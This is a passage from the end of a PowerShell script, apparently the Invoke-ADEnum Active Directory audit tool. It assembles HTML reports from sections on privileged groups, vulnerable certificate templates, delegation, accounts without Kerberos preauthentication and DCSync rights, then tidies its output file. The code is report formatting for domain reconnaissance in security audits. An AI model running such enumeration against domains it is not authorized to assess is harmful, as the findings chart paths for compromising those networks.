	$Report = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLDomainSIDsTable $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $HTMLAccountOperators $HTMLBackupOperators $HTMLCertPublishersGroup $HTMLDNSAdmins $HTMLEnterpriseKeyAdmins $HTMLEnterpriseRODCs $HTMLGPCreatorOwners $HTMLKeyAdmins $HTMLProtectedUsers $HTMLRODCs $HTMLSchemaAdmins $HTMLServerOperators $HTMLGetCurrUserGroup $MisconfigurationsBanner $HTMLCertPublishers $HTMLVulnCertTemplates $HTMLVulnCertComputers $HTMLVulnCertUsers $HTMLUnconstrained $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationUsers $HTMLRBACDObjects $HTMLADComputersCreated $HTMLPasswordSetUsers $HTMLEmptyPasswordUsers $HTMLTotalEmptyPass $HTMLPreWin2kCompatibleAccess $HTMLUnsupportedHosts $HTMLLMCompatibilityLevel $HTMLMachineQuota $InterestingDataBanner $HTMLReplicationUsers $HTMLExchangeTrustedSubsystem $HTMLServiceAccounts $HTMLGMSAs $HTMLnopreauthset $HTMLUsersAdminCount $HTMLGroupsAdminCount $HTMLAdminsInProtectedUsersGroup $HTMLNotSensitiveAdminsInProtectedUsersGroup $HTMLAdminsNotInProtectedUsersGroup $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitive $HTMLNonAdminsInProtectedUsersGroup $HTMLPrivilegedSensitiveUsers $HTMLPrivilegedNotSensitiveUsers $HTMLNonPrivilegedSensitiveUsers $HTMLMachineAccountsPriv $HTMLsidHistoryUsers $HTMLRevEncUsers $HTMLLinkedDAAccounts $HTMLGPOCreators $HTMLGPOsWhocanmodify $HTMLGpoLinkResults $HTMLLAPSGPOs $HTMLLAPSAdminGPOs $HTMLLAPSCanRead $HTMLLAPSExtended $HTMLLapsEnabledComputers $HTMLAppLockerGPOs $HTMLGPOLocalGroupsMembership $HTMLGPOComputerAdmins $HTMLGPOMachinesAdminlocalgroup $HTMLUsersInGroup $HTMLFindLocalAdminAccess $HTMLFindDomainUserLocation $HTMLLoggedOnUsersServerOU $HTMLWin7AndServer2008 $HTMLInterestingServersEnabled $HTMLKeywordDomainGPOs $HTMLGroupsByKeyword $HTMLDomainOUsByKeyword $HTMLDomainShares $HTMLDomainShareFiles $HTMLInterestingFiles $HTMLACLScannerResults $AnalysisBanner $HTMLDomainPolicy $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLComputerAccountAnalysis $HTMLOperatingSystemsAnalysis $HTMLServersEnabled $HTMLServersDisabled $HTMLWorkstationsEnabled $HTMLWorkstationsDisabled $HTMLEnabledUsers $HTMLDisabledUsers $HTMLOtherGroups $HTMLDomainGPOs $HTMLAllDomainOUs $HTMLAllDescriptions" -Title "Active Directory Audit" -Head $header
	$ClientReport = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $MisconfigurationsBanner $HTMLCertPublishers $HTMLADCSEndpointsTable $HTMLVulnCertTemplates $HTMLVulnCertComputers $HTMLVulnCertUsers $HTMLCertTemplatesTable $HTMLUnconstrained $HTMLUnconstrainedTable $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationComputersTable $HTMLConstrainedDelegationUsers $HTMLConstrainedDelegationUsersTable $HTMLRBACDObjects $HTMLRBCDTable $HTMLADComputersCreated $HTMLADComputersCreatedTable $HTMLPasswordSetUsers $HTMLUserPasswordsSetTable $HTMLEmptyPasswordUsers $HTMLEmptyPasswordsTable $HTMLTotalEmptyPass $HTMLTotalEmptyPassTable $HTMLPreWin2kCompatibleAccess $HTMLPreWindows2000Table $HTMLUnsupportedHosts $HTMLUnsupportedOSTable $HTMLLMCompatibilityLevel $HTMLLMCompatibilityLevelTable $HTMLMachineQuota $HTMLMachineAccountQuotaTable $InterestingDataBanner $HTMLReplicationUsers $HTMLDCsyncPrincipalsTable $HTMLServiceAccounts $HTMLServiceAccountsTable $HTMLGMSAs $HTMLGMSAServiceAccountsTable $HTMLnopreauthset $HTMLNoPreauthenticationTable $HTMLUsersAdminCount $HTMLAdminCountUsersTable $HTMLGroupsAdminCount $HTMLAdminCountGroupsTable $HTMLAdminsNotInProtectedUsersGroup $HTMLAdminsNOTinProtectedUsersGroupTable $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitive $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitiveTable $HTMLPrivilegedNotSensitiveUsers $HTMLPrivilegedNOTSensitiveDelegationTable $HTMLMachineAccountsPriv $HTMLMachineAccountsPrivilegedGroupsTable $HTMLsidHistoryUsers $HTMLSDIHistorysetTable $HTMLRevEncUsers $HTMLReversibleEncryptionTable $AnalysisBanner $HTMLDomainPolicy $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLUserAccountAnalysisTable $HTMLComputerAccountAnalysis $HTMLComputerAccountAnalysisTable $HTMLOperatingSystemsAnalysis $HTMLServersDisabled $HTMLWorkstationsDisabled $HTMLDisabledUsers" -Title "Active Directory Audit" -Head $header
 	$HTMLOutputFilePath = $OutputFilePath.Replace(".txt", ".html")
  	$HTMLClientOutputFilePath = $HTMLOutputFilePath.Replace("Invoke-ADEnum", "Invoke-ADEnum_Client-Report")
	$Report | Out-File $HTMLOutputFilePath
 	$ClientReport | Out-File $HTMLClientOutputFilePath
	
	Write-Host ""
	Write-Host "Output files: " -ForegroundColor Yellow
	Write-Host "$OutputFilePath"
	Write-Host "$HTMLOutputFilePath"
 	Write-Host "$HTMLClientOutputFilePath"
	Write-Host ""
    
    # Clean up error lines from output
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'TerminatingError' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: binaryForm""' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSEdition:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSRemotingProtocolVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSCompatibleVersions:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'BuildVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'CLRVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'WSManStackVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PPSRemotingProtocolVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'SerializationVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'End time:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Windows PowerShell transcript end' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Process ID:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Host Application:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Configuration Name:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Start time:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Windows PowerShell transcript start' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Transcript started, output file is' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: enumType""' } | Set-Content $OutputFilePath
    
}
